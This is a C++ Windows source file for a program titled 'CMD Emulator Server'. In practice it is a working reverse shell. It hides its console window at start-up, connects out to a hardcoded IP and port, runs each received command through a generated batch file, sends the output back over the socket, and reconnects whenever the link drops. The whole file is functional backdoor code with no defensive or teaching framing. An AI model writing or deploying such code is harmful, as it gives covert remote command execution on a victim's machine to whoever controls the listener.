// Console.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <includes.h>

#include <winsockfunctions.h>

#pragma comment(lib, "WS2_32.Lib")


//Variables
char strPathArray[256];
char strCommandArray[256];
char strOutputArray[256];
char buf[256];
int Start;
int portNumber = 9999;
string ipAddress = "127.0.0.1";
string strCommand;
string strPath;
string strAppPath;
string strOutput;
string strChangePath;
string strInput;
fstream output;
fstream input;
fstream path;
bool blnGetAppPath;
bool read;
SOCKET kSock = NULL;

int _tmain(int argc, _TCHAR* argv[])
{

// Hide the console on start
typedef HWND (WINAPI *tGetConsoleWindow)(void);
tGetConsoleWindow pGetConsoleWindow = 0;
HINSTANCE handle =  ::LoadLibrary("Kernel32.dll");
if ( handle ) 
  pGetConsoleWindow = (tGetConsoleWindow)::GetProcAddress(handle, "GetConsoleWindow");     
if ( pGetConsoleWindow ) 
{
  HWND hwnd = pGetConsoleWindow();
  ::ShowWindow(hwnd,SW_HIDE);
}
if ( handle )
  ::FreeLibrary(handle);
// End hide code

Beginning:
	//Start winsock
	kSock = startSocket(kSock);
	if (kSock == 0)
	{
		system("pause");
		return 0;
	}
	socketConnect(kSock, ipAddress, portNumber);

	//Get current path
	system("title CMD Emulator Server");
	system("cd >path");
	blnGetAppPath = true;
	while(strCommand != "exit >\\out")
	{
		//UI
		path.open("path",ios::in);
		path.getline(strPathArray,256);
		strPath = strPathArray;
		send(kSock, strPathArray, sizeof(strPathArray), 0);
		if (blnGetAppPath == true)
		{
			strAppPath = strPath;
			blnGetAppPath = false;
		}
		path.close();
		cout << strPath << ">";
		emptyCharArray(buf);
		recv(kSock, buf, sizeof(buf), 0);
		strCommand = buf;
		if (strCommand == "exit")
		{
			cout << endl;
			cout << "Connection closed, restarting program..." << endl;
			endSocket(kSock);
			wait(2);
			goto Beginning;
		}
		else if (strCommand == "") //catch error
		{
			//client exits ugily
			cout << endl;
			cout << "Connection closed, restarting program..." << endl;
			endSocket(kSock);
			wait(2);
			goto Beginning;
		}
		else if (strCommand == "blankcommand") //catch blank command
		{
			strCommand = "";
		}
		strCommand = strCommand.append(" >\"");
		strCommand = strCommand.append(strAppPath);
		strCommand = strCommand.append("\\out\"");
		strInput = "@echo off\ncd ";
		strInput = strInput.append(strPath);
		strInput = strInput.append("\n");
		strInput = strInput.append(strCommand);
		strInput = strInput.append("\ncd >\"");
		strInput = strInput.append(strAppPath);
		strInput = strInput.append("\\path\"");
		input.open("in.bat",ios::out);
		input << strInput;
		input.close();
		system("in.bat");
		system("type out");
		output.open("out",ios::in);
		output.clear();
		output.seekg(ios::beg);
		output.getline(strOutputArray,256); //get first line
		send(kSock, strOutputArray, sizeof(strOutputArray), 0); //send first line
		read = true;
		while(read == true)  //Get and send 2nd line until EOF
		{
			output.getline(strOutputArray,256);
			send(kSock, strOutputArray, sizeof(strOutputArray), 0);
			if(output.eof() == true)
			{
				buf[0] = 't';
				send(kSock, buf, 1, 0);
				read = false;
			}
			else
			{
				buf[0] = 'f';
				send(kSock, buf, 1, 0);
			}
		}
		output.close();
		cout << endl;
	}
	endSocket(kSock);
	return 0;
}
